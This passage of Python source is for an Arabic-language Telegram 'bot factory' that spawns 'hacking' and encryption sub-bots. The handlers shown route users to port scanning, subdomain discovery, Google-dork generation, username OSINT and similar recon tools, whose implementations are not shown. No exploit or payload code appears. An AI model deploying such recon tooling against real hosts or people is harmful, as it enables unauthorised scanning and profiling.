            await send_msg(context.bot, chat_id, "📝 أرسل اسم الزر:")
            return
        elif data == "enable_custom_buttons":
            bot_settings["custom_buttons_enabled_by_admin"] = True
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم تفعيل الأزرار.")
            return
        elif data == "disable_custom_buttons":
            bot_settings["custom_buttons_enabled_by_admin"] = False
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم تعطيل الأزرار.")
            return
        elif data == "remove_custom_button":
            buttons = bot_settings.get("custom_buttons", [])
            if buttons:
                keyboard = [[InlineKeyboardButton(f"🗑 {btn['name']}", callback_data=f"del_custom_btn_{i}")] for i, btn in enumerate(buttons)]
                keyboard.append([InlineKeyboardButton("رجوع", callback_data="back_to_admin")])
                await send_msg(context.bot, chat_id, "اختر الزر للحذف:", reply_markup=InlineKeyboardMarkup(keyboard))
            else:
                await send_msg(context.bot, chat_id, "لا توجد أزرار مضافة.")
            return
        elif data.startswith("del_custom_btn_"):
            btn_index = int(data.replace("del_custom_btn_", ""))
            if 0 <= btn_index < len(bot_settings["custom_buttons"]):
                removed_btn = bot_settings["custom_buttons"].pop(btn_index)
                save_made_bot_settings(current_bot_username)
                await send_msg(context.bot, chat_id, f"✅ تم حذف الزر '{removed_btn['name']}'.")
            return

    # ============ Encryption Bot ============
    if bot_type == "encryption_bot":
        if data == "encrypt_file":
            await edit_msg(context.bot, chat_id, message_id, "اختر نوع التشفير:", reply_markup=get_encryption_types_keyboard())
            bot_user_states[current_bot_username][user_id] = "await_encryption_type"
            return
        elif data == "decrypt_file":
            await edit_msg(context.bot, chat_id, message_id, "اختر نوع فك التشفير:", reply_markup=get_encryption_types_keyboard())
            bot_user_states[current_bot_username][user_id] = "await_decryption_type"
            return
        elif data.startswith("enc_type_"):
            enc_type = data.replace("enc_type_", "")
            current_state = bot_user_states[current_bot_username].get(user_id)
            if current_state == "await_encryption_type":
                await query.answer(f"تم اختيار تشفير {enc_type}. أرسل الملف الآن.", show_alert=True)
                bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_encryption", "type": enc_type}
            elif current_state == "await_decryption_type":
                await query.answer(f"تم اختيار فك تشفير {enc_type}. أرسل الملف الآن.", show_alert=True)
                bot_user_states[current_bot_username][user_id] = {"action": "await_file_for_decryption", "type": enc_type}
            else:
                bot_user_states[current_bot_username][user_id] = None
            return
        elif data == "show_terms_encryption_bot":
            terms_msg = (
                "📜 *الشروط و المتطلبات لبوت التشفير:*\n\n"
                "1. هذا البوت مخصص للأغراض التعليمية فقط.\n"
                "2. خوارزمية SHA256 أحادية الاتجاه ولا يمكن فك تشفيرها.\n"
                "3. الملفات المشفرة تبقى في نفس الصيغة النصية.\n"
                "4. البوت يدعم الملفات النصية فقط.\n"
                "5. للمساعدة أو الاستفسارات، تواصل مع المطور."
            )
            await edit_msg(context.bot, chat_id, message_id, terms_msg, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("رجوع↩️", callback_data="back_to_main_encryption_menu")]]))
            return
        elif data == "back_to_main_encryption_menu":
            bot_user_states[current_bot_username][user_id] = None
            await send_msg(context.bot, chat_id, "مرحبا بك في عالم فك/التشفير 🔐", reply_markup=get_user_keyboard(admin_id, current_bot_username, user_id, bot_type))
            return
        elif data == "no_main_channel_set":
            await query.answer("لم يتم تعيين قناة أساسية بعد.", show_alert=True)
            return

    # ============ Factory Bot ============
    if bot_type == "factory_bot":
        if data == "create_bot_from_factory":
            keyboard = [
                [InlineKeyboardButton("💻 بوت اختراق", callback_data="create_hack_bot_sub")],
                [InlineKeyboardButton("🔐 بوت تشفير py", callback_data="create_encryption_bot_sub")]
            ]
            await edit_msg(context.bot, chat_id, message_id, "اختر نوع البوت:", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        elif data == "create_hack_bot_sub":
            await edit_msg(context.bot, chat_id, message_id, "📝 أرسل توكن البوت:")
            bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "hack_bot"}
            return
        elif data == "create_encryption_bot_sub":
            await edit_msg(context.bot, chat_id, message_id, "📝 أرسل توكن البوت:")
            bot_user_states[current_bot_username][user_id] = {"action": "await_token_sub_bot", "bot_type": "encryption_bot"}
            return
        elif data == "manage_made_bots_from_factory":
            user_bots = created_bots.get(user_id, [])
            if not user_bots:
                await send_msg(context.bot, chat_id, "ليس لديك بوتات.")
            else:
                msg = "بوتاتك:\n\n"
                for bot in user_bots:
                    msg += f"🤖 @{bot['username']} ({bot['bot_type']})\n"
                await send_msg(context.bot, chat_id, msg)
            return
        elif data == "add_factory_admin_sub":
            bot_user_states[current_bot_username][user_id] = {"action": "await_new_sub_admin_id"}
            await send_msg(context.bot, chat_id, "📝 أرسل معرف المستخدم:")
            return
        elif data == "remove_factory_admin_sub":
            bot_user_states[current_bot_username][user_id] = {"action": "await_remove_sub_admin_id"}
            await send_msg(context.bot, chat_id, "📝 أرسل معرف المستخدم:")
            return
        elif data == "factory_sub_stats":
            total_bots = sum(len(bots) for bots in created_bots.values())
            await send_msg(context.bot, chat_id, f"📊 إحصائيات:\n🤖 البوتات: {total_bots}")
            return
        elif data == "broadcast_free_bots_sub":
            bot_user_states[current_bot_username][user_id] = {"action": "await_broadcast_sub_message"}
            await send_msg(context.bot, chat_id, "📝 أرسل الرسالة:")
            return
        elif data == "add_paid_features_sub":
            await send_msg(context.bot, chat_id, "💎 قيد التطوير.")
            return


# =============================================
# handle_message_made_bot
# =============================================
async def handle_message_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    text = update.message.text.strip()
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)

    if not current_bot_username:
        return

    admin_id = get_bot_admin_id(current_bot_username)
    bot_type = get_bot_type(current_bot_username)
    load_made_bot_settings(current_bot_username)
    bot_settings = made_bot_data[current_bot_username]

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None

    state = bot_user_states[current_bot_username].get(user_id)

    # ============ OSINT Tools Processing ============
    if isinstance(state, dict) and state.get("action") == "await_ip":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص IP...")
        result = tool_ip_lookup(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_domain_info":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص النطاق...")
        domain = text.replace("http://", "").replace("https://", "").split("/")[0]
        result = tool_whois_lookup(domain)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_ssl_domain":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص SSL...")
        domain = text.replace("http://", "").replace("https://", "").split("/")[0]
        result = tool_ssl_info(domain)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_http_domain":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص الرؤوس...")
        result = tool_http_headers(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_port_host":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص البورتات... قد يستغرق هذا لحظات.")
        host = text.replace("http://", "").replace("https://", "").split("/")[0]
        result = tool_port_scan(host)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_subdomain_domain":
        await send_msg(context.bot, chat_id, "⏳ جاري البحث عن النطاقات الفرعية...")
        domain = text.replace("http://", "").replace("https://", "").split("/")[0]
        result = tool_subdomain_finder(domain)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_whois_domain":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص Whois...")
        domain = text.replace("http://", "").replace("https://", "").split("/")[0]
        result = tool_whois_lookup(domain)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_dns_domain":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص DNS...")
        domain = text.replace("http://", "").replace("https://", "").split("/")[0]
        result = tool_dns_lookup(domain)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_email":
        await send_msg(context.bot, chat_id, "⏳ جاري فحص البريد...")
        result = tool_email_check(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_osint_username":
        await send_msg(context.bot, chat_id, "⏳ جاري البحث عن المستخدم... قد يستغرق هذا لحظات.")
        result = tool_username_osint(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_dork_topic":
        result = tool_google_dork(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_hash_text":
        result = tool_hash_info(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_qr_text":
        qr_url = tool_qr_code(text)
        await send_msg(context.bot, chat_id, f"📱 QR Code:\n{qr_url}")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_url_encode_text":
        result = tool_url_encode_decode(text, "encode")
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_url_decode_text":
        result = tool_url_encode_decode(text, "decode")
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_b64_encode_text":
        result = tool_base64_encode_decode(text, "encode")
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_b64_decode_text":
        result = tool_base64_encode_decode(text, "decode")
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_mac_address":
        result = tool_mac_lookup(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_ping_host":
        await send_msg(context.bot, chat_id, "⏳ جاري Ping...")
        result = tool_ping(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_traceroute_host":
        await send_msg(context.bot, chat_id, "⏳ جاري تتبع المسار...")
        result = tool_traceroute(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_cidr":
        result = tool_cidr_info(text)
        await send_msg(context.bot, chat_id, result, parse_mode=ParseMode.MARKDOWN)
        bot_user_states[current_bot_username][user_id] = None
        return

    # ============ Original Tools Processing ============
    if isinstance(state, dict) and state.get("action") == "await_image_prompt":
        await send_msg(context.bot, chat_id, "⏳ جاري توليد الصورة...")
        image_url = generate_image_via_api(text, current_bot_username, user_id)
        if image_url:
            await send_msg(context.bot, chat_id, image_url)
        else:
            await send_msg(context.bot, chat_id, "❌ حدث خطأ أثناء توليد الصورة.")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_tts_text":
        await send_msg(context.bot, chat_id, "⏳ جاري تحويل النص إلى صوت...")
        audio_url = convert_text_to_speech_via_api(text, current_bot_username, user_id)
        if audio_url:
            await send_msg(context.bot, chat_id, audio_url)
        else:
            await send_msg(context.bot, chat_id, "❌ حدث خطأ أثناء تحويل النص إلى صوت.")
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_ai_prompt":
        await send_msg(context.bot, chat_id, "⏳ جاري التفكير...")
        ai_response = interact_with_ai_api(text, "ai", current_bot_username, user_id)
        await send_msg(context.bot, chat_id, ai_response)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_dream_text":
        await send_msg(context.bot, chat_id, "⏳ جاري تفسير الحلم...")
        dream_interpretation = interact_with_ai_api(text, "dream_interpret", current_bot_username, user_id)
        await send_msg(context.bot, chat_id, dream_interpretation)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_genie_question":
        await send_msg(context.bot, chat_id, "⏳ المارد يفكر...")
        genie_response = interact_with_ai_api(text, "blue_genie_game", current_bot_username, user_id)
        await send_msg(context.bot, chat_id, genie_response)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_name_to_decorate":
        name_type = state.get("name_type", "english")
        if name_type == "english":
            result = decorate_english_name(text)
        else:
            result = decorate_arabic_name(text)
        await send_msg(context.bot, chat_id, result)
        bot_user_states[current_bot_username][user_id] = None
        return

    if isinstance(state, dict) and state.get("action") == "await_url_to_check":
        result_msg, error_msg = check_url_virustotal_data(text)
        if result_msg:
            await send_msg(context.bot, chat_id, result_msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await send_msg(context.bot, chat_id, error_msg)
        bot_user_states[current_bot_username][user_id] = None
        return

    # ============ Admin Panel Messages ============
    if user_id == admin_id and isinstance(state, dict):
        action = state.get("action")

        if action == "await_broadcast_message":
            sent_count = 0
            for member_id in bot_settings.get("members", []):
                try:
                    await context.bot.send_message(chat_id=member_id, text=text)
                    sent_count += 1
                except Exception as e:
                    logging.error(f"Error sending broadcast to {member_id}: {e}")
            await send_msg(context.bot, chat_id, f"✅ تم إرسال الرسالة إلى {sent_count} عضو.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_forward_message":
            sent_count = 0
            for member_id in bot_settings.get("members", []):
                try:
                    await context.bot.forward_message(chat_id=member_id, from_chat_id=chat_id, message_id=update.message.message_id)
                    sent_count += 1
                except Exception as e:
                    logging.error(f"Error forwarding to {member_id}: {e}")
            await send_msg(context.bot, chat_id, f"✅ تم توجيه الرسالة إلى {sent_count} عضو.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_new_start_message":
            bot_settings["start_message"] = text
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, "✅ تم تغيير رسالة البدء.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_channel_for_subscription":
            channel = text if text.startswith("@") else f"@{text}"
            if channel not in bot_settings["channels"]:
                bot_settings["channels"].append(channel)
                save_made_bot_settings(current_bot_username)
                await send_msg(context.bot, chat_id, f"✅ تم إضافة {channel}")
            else:
                await send_msg(context.bot, chat_id, "⚠️ هذه القناة مضافة بالفعل.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_ban_user_id":
            try:
                ban_id = int(text)
                if ban_id not in bot_settings["banned_users"]:
                    bot_settings["banned_users"].append(ban_id)
                    save_made_bot_settings(current_bot_username)
                    await send_msg(context.bot, chat_id, f"✅ تم حظر {ban_id}")
                else:
                    await send_msg(context.bot, chat_id, "⚠️ هذا المستخدم محظور بالفعل.")
            except:
                await send_msg(context.bot, chat_id, "❌ معرف غير صالح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_unban_user_id":
            try:
                unban_id = int(text)
                if unban_id in bot_settings["banned_users"]:
                    bot_settings["banned_users"].remove(unban_id)
                    save_made_bot_settings(current_bot_username)
                    await send_msg(context.bot, chat_id, f"✅ تم إلغاء حظر {unban_id}")
                else:
                    await send_msg(context.bot, chat_id, "⚠️ هذا المستخدم غير محظور.")
            except:
                await send_msg(context.bot, chat_id, "❌ معرف غير صالح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_paid_user_id":
            try:
                paid_id = int(text)
                if paid_id not in bot_settings["paid_users"]:
                    bot_settings["paid_users"].append(paid_id)
                    save_made_bot_settings(current_bot_username)
                    await send_msg(context.bot, chat_id, f"✅ تم إضافة {paid_id} كمدفوع.")
                else:
                    await send_msg(context.bot, chat_id, "⚠️ هذا المستخدم مدفوع بالفعل.")
            except:
                await send_msg(context.bot, chat_id, "❌ معرف غير صالح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_remove_paid_user_id":
            try:
                remove_id = int(text)
                if remove_id in bot_settings["paid_users"]:
                    bot_settings["paid_users"].remove(remove_id)
                    save_made_bot_settings(current_bot_username)
                    await send_msg(context.bot, chat_id, f"✅ تم إزالة {remove_id} من المدفوعين.")
                else:
                    await send_msg(context.bot, chat_id, "⚠️ هذا المستخدم ليس مدفوع.")
            except:
                await send_msg(context.bot, chat_id, "❌ معرف غير صالح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_payload_points":
            try:
                points = int(text)
                bot_settings["payload_points_required"] = points
                save_made_bot_settings(current_bot_username)
                await send_msg(context.bot, chat_id, f"✅ تم تعيين النقاط المطلوبة: {points}")
            except:
                await send_msg(context.bot, chat_id, "❌ أرسل رقم صحيح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_channel_name_for_link":
            bot_settings["main_channel_link"] = text
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, f"✅ تم تعيين القناة الأساسية.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_custom_button_name":
            bot_user_states[current_bot_username][user_id] = {"action": "await_custom_button_value", "button_name": text}
            await send_msg(context.bot, chat_id, "📝 أرسل رابط الزر:")
            return

        if action == "await_custom_button_value":
            new_button = {"name": state.get("button_name"), "type": "internal_link", "value": text}
            bot_settings["custom_buttons"].append(new_button)
            save_made_bot_settings(current_bot_username)
            await send_msg(context.bot, chat_id, f"✅ تم إضافة الزر '{state.get('button_name')}'.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_new_sub_admin_id":
            try:
                new_admin_id = int(text)
                if new_admin_id not in bot_settings.get("factory_sub_admins", []):
                    bot_settings.setdefault("factory_sub_admins", []).append(new_admin_id)
                    save_made_bot_settings(current_bot_username)
                    await send_msg(context.bot, chat_id, f"✅ تم إضافة {new_admin_id} كأدم.")
                else:
                    await send_msg(context.bot, chat_id, "⚠️ هذا المستخدم أدمن بالفعل.")
            except:
                await send_msg(context.bot, chat_id, "❌ معرف غير صالح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_remove_sub_admin_id":
            try:
                remove_admin_id = int(text)
                if remove_admin_id in bot_settings.get("factory_sub_admins", []):
                    bot_settings["factory_sub_admins"].remove(remove_admin_id)
                    save_made_bot_settings(current_bot_username)
                    await send_msg(context.bot, chat_id, f"✅ تم حذف {remove_admin_id} من الأدمنز.")
                else:
                    await send_msg(context.bot, chat_id, "⚠️ هذا المستخدم ليس أدمن.")
            except:
                await send_msg(context.bot, chat_id, "❌ معرف غير صالح.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_broadcast_sub_message":
            sent_count = 0
            for member_id in bot_settings.get("members", []):
                try:
                    await context.bot.send_message(chat_id=member_id, text=text)
                    sent_count += 1
                except Exception as e:
                    logging.error(f"Error: {e}")
            await send_msg(context.bot, chat_id, f"✅ تم إرسال الرسالة إلى {sent_count} عضو.")
            bot_user_states[current_bot_username][user_id] = None
            return

        if action == "await_token_sub_bot":
            await send_msg(context.bot, chat_id, "⏳ جاري الإعداد...")
            sub_bot_token = text
            sub_bot_type = state["bot_type"]
            try:
                bot_info_resp = requests.get(f"https://api.telegram.org/bot{sub_bot_token}/getMe").json()
                if not bot_info_resp.get("ok"):
                    await send_msg(context.bot, chat_id, "❌ توكن غير صالح.")
                    bot_user_states[current_bot_username][user_id] = None
                    return

                sub_bot_username = bot_info_resp["result"]["username"]
                user_bots = created_bots.get(user_id, [])
                user_bots.append({
                    "token": sub_bot_token,
                    "admin_id": user_id,
                    "username": sub_bot_username,
                    "bot_type": sub_bot_type
                })
                created_bots[user_id] = user_bots

                sub_bot_file = os.path.join(DATABASE_DIR, f"{sub_bot_username}.json")
                with open(sub_bot_file, 'w') as f:
                    json.dump({"token": sub_bot_token, "admin_id": user_id, "bot_type": sub_bot_type}, f)

                await send_msg(context.bot, chat_id, f"✅ تم تشغيل بوت @{sub_bot_username} بنجاح! 🎉")
                threading.Thread(
                    target=run_made_bot,
                    args=(sub_bot_token, user_id, sub_bot_username, sub_bot_type),
                    daemon=True
                ).start()
            except Exception as e:
                logging.error(f"Error: {e}")
                await send_msg(context.bot, chat_id, "❌ حدث خطأ أثناء إنشاء البوت.")
            bot_user_states[current_bot_username][user_id] = None
            return


# =============================================
# handle_document_made_bot
# =============================================
async def handle_document_made_bot(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    current_bot_token = context.bot.token
    current_bot_username = get_bot_username_from_token(current_bot_token)

    if not current_bot_username:
        return

    if get_bot_type(current_bot_username) != "encryption_bot":
        return

    if current_bot_username not in bot_user_states:
        bot_user_states[current_bot_username] = {}
    if user_id not in bot_user_states[current_bot_username]:
        bot_user_states[current_bot_username][user_id] = None

    state = bot_user_states[current_bot_username].get(user_id)
    if not isinstance(state, dict):
        return

    enc_type = state.get("type")
    action = state.get("action")

    if action in ["await_file_for_encryption", "await_file_for_decryption"]:
        try:
            file = await update.message.document.get_file()
            file_bytes = await file.download_as_bytearray()
            if action == "await_file_for_encryption":
                result = encrypt_data(file_bytes, enc_type)
            else:
                result = decrypt_data(file_bytes, enc_type)

            result_path = os.path.join(DATABASE_DIR, f"result_{user_id}.txt")
            with open(result_path, 'wb') as f:
                f.write(result)
            with open(result_path, 'rb') as f:
                await context.bot.send_document(chat_id=chat_id, document=f)
            os.remove(result_path)
            await send_msg(context.bot, chat_id, "✅ تمت العملية بنجاح!")
        except Exception as e:
            logging.error(f"Error processing file: {e}")
            await send_msg(context.bot, chat_id, "❌ حدث خطأ أثناء معالجة الملف.")
        bot_user_states[current_bot_username][user_id] = None


# =============================================
# Main Entry Point
# =============================================
async def post_init(application):
    logging.info("Application initialized successfully")


async def error_handler(update, context):
    logging.error(f"Exception while handling an update: {context.error}")


def main():
    app = ApplicationBuilder().token(MAIN_BOT_TOKEN).post_init(post_init).build()
    app.add_error_handler(error_handler)

    app.add_handler(CommandHandler("start", start_main_bot))
    app.add_handler(CallbackQueryHandler(create_bot_main_bot, pattern="^create_bot$"))
    app.add_handler(CallbackQueryHandler(manage_bots_main_bot, pattern="^manage_bots$"))
    app.add_handler(CallbackQueryHandler(create_hack_bot_main_bot, pattern="^create_hack_bot$"))
    app.add_handler(CallbackQueryHandler(create_encryption_bot_main_bot, pattern="^create_encryption_bot$"))
    app.add_handler(CallbackQueryHandler(create_factory_bot_main_bot, pattern="^create_factory_bot$"))
    app.add_handler(CallbackQueryHandler(bot_info_main_bot, pattern="^info_"))
    app.add_handler(CallbackQueryHandler(delete_bot_main_bot, pattern="^delete_"))
    app.add_handler(CallbackQueryHandler(add_factory_admin_main_bot, pattern="^add_factory_admin$"))
    app.add_handler(CallbackQueryHandler(remove_factory_admin_main_bot, pattern="^remove_factory_admin$"))
    app.add_handler(CallbackQueryHandler(factory_stats_main_bot, pattern="^factory_stats$"))
    app.add_handler(CallbackQueryHandler(stop_all_bots_main_bot, pattern="^stop_all_bots$"))
    app.add_handler(CallbackQueryHandler(start_all_bots_main_bot, pattern="^start_all_bots$"))
    app.add_handler(CallbackQueryHandler(broadcast_free_bots_main_bot, pattern="^broadcast_free_bots$"))
    app.add_handler(CallbackQueryHandler(add_factory_main_subscription, pattern="^add_factory_main_sub$"))
    app.add_handler(CallbackQueryHandler(remove_factory_main_subscription, pattern="^remove_factory_main_sub$"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message_main_bot))

    # Load all bots from database and start them
    if os.path.exists(DATABASE_DIR):
        for filename in os.listdir(DATABASE_DIR):
            if filename.endswith(".json") and not filename.endswith("_settings.json"):
                bot_username = filename.replace(".json", "")
                try:
                    with open(os.path.join(DATABASE_DIR, filename), 'r') as f:
                        bot_data = json.load(f)
                    if bot_data.get("token"):
                        threading.Thread(
                            target=run_made_bot,
                            args=(bot_data["token"], bot_data.get("admin_id"), bot_username, bot_data.get("bot_type", "hack_bot")),
                            daemon=True
                        ).start()
                        logging.info(f"Started bot @{bot_username}")
                except Exception as e:
                    logging.error(f"Error loading bot {bot_username}: {e}")

    logging.info("Main bot starting...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
